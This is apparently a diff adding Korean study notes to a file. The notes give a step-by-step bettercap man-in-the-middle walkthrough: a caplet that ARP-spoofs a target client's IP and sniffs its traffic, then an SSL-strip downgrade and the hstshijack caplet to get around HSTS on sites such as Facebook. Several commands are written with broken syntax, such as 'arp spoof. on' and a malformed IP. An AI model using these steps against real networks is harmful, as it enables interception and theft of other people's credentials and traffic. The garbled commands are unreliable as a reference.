@@ -76,3 +76,49 @@ fullduplex 기능을 사용하면 라우터와 공격대상 기기 사이에 내
 스푸핑한 데이터는 분석 가능한데 bettercap에서는 net.sniff라는 모듈로 가능.
 bettercap 작동 하에서 net.sniff on 커맨드 시 캡처한 것들은 분석해줌.
 
+이 모든 작업이 귀찮을 경우 캐플릿을 이용하면 된다.
+캐플릿은 텍스트 파일로 만들 수 있다.
+net.probe.on (해당 네트워크, 라우터에 관련된 모든 클라이언트를 보여준다.)
+set arp.spoof.fullduplex true (대상 클라이언트와 라우터 양 쪽에 내 ip로 송수신 받는 곳을 위장)
+set arp.spoof.targets 192. 10. 2. 117(대상 클라이언트 ip를 지정함. 다수 클라이언트 대상일 경우 첫 ip주소 다음에 , 하고 입력)
+arp spoof. on(spoof를 작동)
+net.sniff on(대상 클라이언트와 라우터 사이에 데이터를 스니핑함)
+해당 파일을 root 디렉터리에 넣고 spoof.cap으로 저장해줌.
+터미네이터에서 
+pwd 커맨드
+최상위 root 디렉터리로 간다
+ls를 커맨드하면 
+현재 root 디렉터리 하에 모든 파일, 폴더를 보여준다.
+여기에 spoof.cap이 있음을 확인.
+이후 bettercap을 실행, 아래 커맨
+bettercap -iface eth0(타겟 네트워크에 연결된 인터페이스를 지정) -caplet /root/spoof.cap(캐필릿용 파일명과 디렉터리을 입력)
+이 방법은 http 하에서만 가능. https에서는 안된다.
+
+https를 우회하는 법
+https는 tls, ssl로 보안처리되어 있기에 우회는 법은 https를 http로 다운그레이트 시키는 방법이다.
+bettercap을 통해 중간에서 arp를 spoof 했기에 대상이 https를 요청해도 나는 https가 아닌 http를 제공하여 대상이 http로 다시금 요청하게 한다.
+bettercap에서는 해당 기능의 캐플릿도 있다.
+이전에 만든 캐플릿 텍스트 파일을 수정.
+
+net.probe.on (해당 네트워크, 라우터에 관련된 모든 클라이언트를 보여준다.)
+set arp.spoof.fullduplex true (대상 클라이언트와 라우터 양 쪽에 내 ip로 송수신 받는 곳을 위장)
+set arp.spoof.targets 192. 10. 2. 117(대상 클라이언트 ip를 지정함. 다수 클라이언트 대상일 경우 첫 ip주소 다음에 , 하고 입력)
+arp spoof. on(spoof를 작동)
+set net.sniff.local true(해당 데이터가 로컬데이터라고 생각되어도 bettercap에서 모든 데이터 스니핑하도록 지시, 즉 클라이언트가 https로 보내려하면 bettercap이 tls연결을 가로챈 뒤 자체 종료시키고 bettercap서버에서 제공하는 가짜 https링크로 변)
+net.sniff on(대상 클라이언트와 라우터 사이에 데이터를 스니핑함)
+
+위 수정된 캐플릿 텍스트파일에
+bettercap -iface eth0(타겟 네트워크에 연결된 인터페이스를 지정) -caplet /root/spoof.cap(캐필릿용 파일명과 디렉터리을 입력)
+입력 후 help를 커맨드하면 정상 작동하는지 알 수 있다.
+하지만 https가 아닌 http로 다운그레이드 시킨 것들의 정보를 가져오려면 hst바이패스 캐플릿이 필요.
+여기서 caplets.show 커맨드를 입력
+다양한 캐플릿들 도구들이 나오는데 이때 
+hstshijack/hstshijack 를 사용해야하므로 
+해당 네임인 hstshijack/hstshijack 직접 타이핑 혹은 h를 치고 tab을 눌러 자동완성을 하여 실행
+왠만한 사이트는 되지만 페이스북 같은 개인정보가 중요한 곳은 hst로 우회한다.
+
+
+
+
+
+
